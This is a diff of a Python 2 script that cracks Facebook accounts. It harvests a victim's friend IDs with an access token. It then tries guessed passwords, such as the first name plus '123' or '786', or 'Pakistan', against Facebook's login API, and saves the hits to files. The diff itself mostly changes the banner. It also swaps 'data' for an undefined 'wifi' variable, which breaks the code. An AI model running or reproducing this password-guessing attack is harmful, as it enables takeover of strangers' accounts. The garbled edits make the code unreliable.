@@ -53,7 +53,7 @@ logo = """
 \033[0;39m
 \033[0;39m
 \033[0;39m
-\033[0;39m
+
 ╭━━┳━━╮╭━━━┳━━━┳╮╱╭┳━━┳━╮╭━╮
 ╰┫┣┫╭╮┃┃╭━╮┃╭━╮┃┃╱┃┣┫┣┫┃╰╯┃┃
 ╱┃┃┃╰╯╰┫╰━╯┃┃╱┃┃╰━╯┃┃┃┃╭╮╭╮┃
@@ -62,8 +62,8 @@ logo = """
 ╰━━┻━━━┻╯╰━┻╯╱╰┻╯╱╰┻━━┻╯╰╯╰╯
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
 \033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|IBRAHIM \033[0;31m║
-\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \https://github.com/Ibrahim0980/
-\033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[03152473747]\033[0;31m║
+\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \https://github.com/Ibrahim0980/IBRAHIM
+\033[0;39m║\033[0;36m* \033[0;32mWhatsApp
 \033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
 def tik():
@@ -83,9 +83,9 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print "\x1b[0;31m⚔═══════════════════════════☠═══════════════════════════⚔"
-print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 03152473747\x1b[1;96m  
+print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [¤] \x1b[0;31mWHATSAPP : 00000000000\x1b[1;96m  
 \033[1;93m [¤] \x1b[0;31mSTAY HOME\x1b[1;96m      [¤] \x1b[0;31mFACEBOOK : TERMUX TOOLS\x1b[1;96m  
-\033[1;93m [¤] \x1b[0;31mTOOLS BY IBRAHIM\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : IBRAHIM CREATIONSs\x1b[0;31m"""
+\033[1;93m [¤] \x1b[0;31mTOOLS BY termux \x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : IBRAHIM CREATIONS\x1b[0;31m"""
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
 CorrectUsername = "ibrahim"
@@ -255,7 +255,7 @@ def pilih_super():
 		jalan('\033[1;93m[✺] Getting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
-		for s in z['data']:
+		for s in z['wifi']:
 			id.append(s['id'])
 
 	elif peak =="2":
@@ -273,7 +273,7 @@ def pilih_super():
 		print"\033[1;35;40m[✺] Getting IDs..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
-		for i in z['data']:
+		for i in z['wifi']:
 			id.append(i['id'])
 	elif peak =="3":
 		os.system('clear')
@@ -320,13 +320,13 @@ def pilih_super():
 			b = json.loads(a.text)
 			pass1 = b['first_name'] + '786'
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-			q = json.load(data)
+			q = json.load(wifi)
 			if 'access_token' in q:
-				print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' 👽 ' + b['name']
+				print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass1 + ' 😋 ' + b['name']
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' 👽 ' + b['name']
+					print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass1 + ' 😋 ' + b['name']
 					cek = open("out/CP.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
@@ -334,7 +334,7 @@ def pilih_super():
 				else:
 					pass2 = b['first_name'] + '123'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-					q = json.load(data)
+					q = json.load(wifi)
 					if 'access_token' in q:
 						print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass2 + ' 👽 ' + b['name']
 						oks.append(user+pass2)
@@ -348,7 +348,7 @@ def pilih_super():
 						else:
 							pass3 = b['first_name'] + '12345'
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-							q = json.load(data)
+							q = json.load(wifi)
 							if 'access_token' in q:
 								print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' 👽 ' + b['name']
 								oks.append(user+pass3)
@@ -362,7 +362,7 @@ def pilih_super():
 								else:
 									pass4 = b['first_name'] + '1234'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-									q = json.load(data)
+									q = json.load(wifi)
 									if 'access_token' in q:
 										print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass4 + ' 👽 ' + b['name']
 										oks.append(user+pass4)
@@ -404,7 +404,7 @@ def pilih_super():
 														else:
 															pass7 = 'Pakistan'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-															q = json.load(data)
+															q = json.load(wifi)
 															if 'access_token' in q:
 																print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass7 + ' 👽 ' + b['name']
 																oks.append(user+pass7)
